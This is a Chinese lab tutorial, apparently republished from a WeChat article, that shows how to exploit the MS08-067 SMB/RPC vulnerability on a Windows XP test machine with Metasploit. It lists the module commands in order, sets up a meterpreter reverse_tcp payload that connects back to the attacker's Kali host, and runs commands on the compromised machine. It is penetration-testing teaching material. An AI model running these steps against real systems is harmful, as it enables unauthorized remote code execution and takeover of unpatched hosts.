# 利用msf工具进行靶机渗透研究

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MjM5NjA0NjgyMA==&mid=2651125949&idx=4&sn=aa66bdeb97e9582765bb09c5b79198f3&chksm=bd1f6a368a68e320aae5a93ac74d5ee3ec7c0ae9d47fe220113896848ec3b45109f5c2710286&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651125949&idx=4&sn=aa66bdeb97e9582765bb09c5b79198f3&chksm=bd1f6a368a68e320aae5a93ac74d5ee3ec7c0ae9d47fe220113896848ec3b45109f5c2710286&scene=27#wechat_redirect)

### 漏洞简介

MS08-067漏洞将会影响Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。

如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程执行代码。在 Microsoft Windows 2000、Windows XP 和 Windows Server 2003 系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码。此漏洞可能用于进行蠕虫攻击。防火墙最佳做法和标准的默认防火墙配置有助于保护网络资源免受从企业外部发起的攻击。

### 实验环境：

工具：metasploit

靶机两台：windows xp2和kali2020

攻击机的IP（kali）：192.168.29.133

靶机IP（xp2）: 192.168.29.134

实验条件：两台机子可以互通的，并且windows xp2（需打开445端口，默认为打开）开启了445端口，防火墙是关闭的。

### 步骤：

（1）在kali终端输入msfconsole，启动Metasploit工具

![](../Images/bd61bca9244b23b9c1f476787817b2c7.png)

（2）输入命令search ms08\_067,查找关于ms08\_0\*\*67的漏洞模块。

![](../Images/f37f7c4bb9face1a5fc1bd04a026bda3.png)

（3）输入如下命令，使用该漏洞模块

![](../Images/984caf0dc22557a3af6974cd1fde4666.png)

（4）进入这个模块后，用show options 查看该模块需要配置的参数

![](../Images/00bf11b9c30dbfec6373399c1b0a50b7.png)

（5）设置配置项（show options）

设置靶机IP（xp2）set RHOST 192.168.29.134

![](../Images/5f4636d2164790278fa972a6b9ac95bf.png)

**设置要执行的payload:**

set payload windows/meterpreter/reverse\_tcp

![](../Images/99184844d3ea8a0b1fd6ee9ec7340f3d.png)

**设置攻击机的IP（kali）：**

set LHOST 192.168.29.133

![](../Images/a08f39338988e60f0f92e75c57d01650.png)

**设置要攻击的目标操作系统类型：**

set target 34

![](../Images/f01c91506530394dabfee47010ab95f2.png)

**用show options查看相关参数是否配置正确**

![](../Images/53789baceb0d9504f0fdbb81dcd038b3.png)

（6）最后，输入exploit，回车运行,进入到特殊的payload—-meterpreter，该payload在控制靶机之后，能够对靶机执行更多的渗透攻击。用 pwd查看靶机当前的工作路径，用ipconfig命令查看靶机的IP地址配置

![](../Images/16beea214304d9e06256505a18a83c05.png)  

![](../Images/bb1954e3b82b71c6409f55d8c412afeb.png)
